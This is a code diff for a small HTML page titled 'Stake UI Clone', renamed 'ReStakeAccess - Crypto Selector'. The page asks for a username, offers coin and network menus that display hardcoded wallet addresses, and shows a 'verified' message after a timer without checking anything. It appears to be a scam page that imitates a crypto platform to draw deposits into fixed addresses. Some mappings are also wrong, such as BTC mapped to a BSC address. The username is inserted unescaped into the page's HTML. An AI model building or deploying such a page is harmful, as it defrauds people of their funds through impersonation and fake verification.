@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Stake UI Clone</title>
+  <title>ReStakeAccess - Crypto Selector</title>
   <style>
     body {
       margin: 0;
@@ -24,7 +24,7 @@
       width: 90%;
       max-width: 400px;
     }
-    input {
+    input, select {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
@@ -38,27 +38,118 @@
       font-weight: bold;
       border-radius: 5px;
       margin-top: 10px;
+      cursor: pointer;
+    }
+    .address-box {
+      background: #111;
+      padding: 10px;
+      border-radius: 5px;
+      word-break: break-all;
+      margin-top: 10px;
+      color: #00ffcc;
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Username Verification</h2>
-    <input type="text" placeholder="Enter username" id="username" />
-    <p>BSC Address:</p>
-    <p style="color: #00ff99;">0x65bf6f6795e14a270e964e6110fc74d74287f132</p>
-    <p>Network: BSC</p>
+    <h2>Send Crypto</h2>
+    <input type="text" id="username" placeholder="Enter username" />
+
+    <label for="coin">Select Coin:</label>
+    <select id="coin" onchange="updateNetworkOptions()">
+      <option value="">-- Select Coin --</option>
+      <option value="USDT">USDT</option>
+      <option value="BTC">BTC</option>
+      <option value="TRX">TRX</option>
+      <option value="Ethereum">Ethereum</option>
+    </select>
+
+    <label for="network">Select Network:</label>
+    <select id="network" onchange="showAddress()">
+      <option value="">-- Select Network --</option>
+    </select>
+
+    <div id="address" class="address-box" style="display: none;"></div>
+
     <button class="btn" onclick="verify()">Verify Username</button>
     <p id="status"></p>
   </div>
+
   <script>
+    const addressMap = {
+      USDT: {
+        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      },
+      BTC: {
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      },
+      TRX: {
+        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      },
+      Ethereum: {
+        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
+      }
+    };
+
+    function updateNetworkOptions() {
+      const coin = document.getElementById("coin").value;
+      const networkSelect = document.getElementById("network");
+      const addressDiv = document.getElementById("address");
+
+      // Reset
+      networkSelect.innerHTML = '<option value="">-- Select Network --</option>';
+      addressDiv.style.display = 'none';
+
+      if (coin && addressMap[coin]) {
+        const networks = Object.keys(addressMap[coin]);
+        networks.forEach(network => {
+          const option = document.createElement("option");
+          option.value = network;
+          option.text = network;
+          networkSelect.appendChild(option);
+        });
+      }
+    }
+
+    function showAddress() {
+      const coin = document.getElementById("coin").value;
+      const network = document.getElementById("network").value;
+      const addressDiv = document.getElementById("address");
+
+      if (coin && network && addressMap[coin][network]) {
+        addressDiv.innerText = addressMap[coin][network];
+        addressDiv.style.display = "block";
+      } else {
+        addressDiv.style.display = "none";
+      }
+    }
+
     function verify() {
+      const username = document.getElementById("username").value.trim();
+      const coin = document.getElementById("coin").value;
+      const network = document.getElementById("network").value;
+      const address = addressMap[coin]?.[network];
       const status = document.getElementById("status");
+
+      if (!username || !coin || !network || !address) {
+        status.innerHTML = "⚠️ Please fill all fields correctly.";
+        status.style.color = "orange";
+        return;
+      }
+
       status.innerHTML = "Verifying...";
+      status.style.color = "white";
+
       setTimeout(() => {
-        status.innerHTML = "Verified!";
+        status.innerHTML = `
+          ✅ <b>${username}</b> verified for:<br>
+          <b>${coin} on ${network}</b><br>
+          <small style="color:#00ff99">${address}</small>
+        `;
         status.style.color = "#00ff99";
-      }, 2000);
+      }, 1500);
     }
   </script>
 </body>
